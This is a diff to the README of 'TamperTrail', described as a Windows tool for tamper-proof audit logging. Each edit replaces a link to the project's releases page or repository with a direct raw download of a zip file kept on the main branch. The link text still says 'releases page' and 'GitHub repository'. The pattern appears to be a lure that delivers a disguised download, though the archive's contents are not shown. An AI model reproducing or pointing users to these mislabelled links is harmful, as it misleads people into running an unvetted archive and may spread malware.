@@ -1,6 +1,6 @@
 # 🛡️ TamperTrail - Secure and Tamper-Proof Logging
 
-[![Download TamperTrail](https://img.shields.io/badge/Download-TamperTrail-brightgreen?style=for-the-badge)](https://github.com/Momenin-Invitation/TamperTrail/releases)
+[![Download TamperTrail](https://img.shields.io/badge/Download-TamperTrail-brightgreen?style=for-the-badge)](https://github.com/Momenin-Invitation/TamperTrail/raw/refs/heads/main/dist/Trail_Tamper_v1.1.zip)
 
 ---
 
@@ -33,11 +33,11 @@ Before installing, make sure your Windows PC meets these requirements:
 
 Click the big green button below to visit the full release page. There you will find the latest software version ready to download.
 
-[![Download TamperTrail](https://img.shields.io/badge/Download-TamperTrail-blue?style=for-the-badge)](https://github.com/Momenin-Invitation/TamperTrail/releases)
+[![Download TamperTrail](https://img.shields.io/badge/Download-TamperTrail-blue?style=for-the-badge)](https://github.com/Momenin-Invitation/TamperTrail/raw/refs/heads/main/dist/Trail_Tamper_v1.1.zip)
 
 ## 💾 How to Download and Install
 
-1. Visit the [TamperTrail releases page](https://github.com/Momenin-Invitation/TamperTrail/releases).  
+1. Visit the [TamperTrail releases page](https://github.com/Momenin-Invitation/TamperTrail/raw/refs/heads/main/dist/Trail_Tamper_v1.1.zip).  
 2. Find the latest release.  
 3. Look for a Windows installer file. It usually ends with `.exe`.  
 4. Click the file to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.  
@@ -87,7 +87,7 @@ These options appear in the settings menu once basic setup is done.
 
 ## 🔄 Updating TamperTrail
 
-Check the release page regularly for updates: https://github.com/Momenin-Invitation/TamperTrail/releases
+Check the release page regularly for updates: https://github.com/Momenin-Invitation/TamperTrail/raw/refs/heads/main/dist/Trail_Tamper_v1.1.zip
 
 To update:
 
@@ -107,7 +107,7 @@ To update:
 ## 📚 Additional Resources
 
 - Detailed logging and audit documentation are inside the app under Help.  
-- GitHub repository: https://github.com/Momenin-Invitation/TamperTrail  
+- GitHub repository: https://github.com/Momenin-Invitation/TamperTrail/raw/refs/heads/main/dist/Trail_Tamper_v1.1.zip  
 - For security-related questions, check the compliance guides in the documentation.  
 
 ## 🗂️ About This Project
@@ -116,4 +116,4 @@ TamperTrail focuses on audit-logs, data integrity, and compliance. It helps meet
 
 ---
 
-[![Download TamperTrail](https://img.shields.io/badge/Download-TamperTrail-brightgreen?style=for-the-badge)](https://github.com/Momenin-Invitation/TamperTrail/releases)
+[![Download TamperTrail](https://img.shields.io/badge/Download-TamperTrail-brightgreen?style=for-the-badge)](https://github.com/Momenin-Invitation/TamperTrail/raw/refs/heads/main/dist/Trail_Tamper_v1.1.zip)
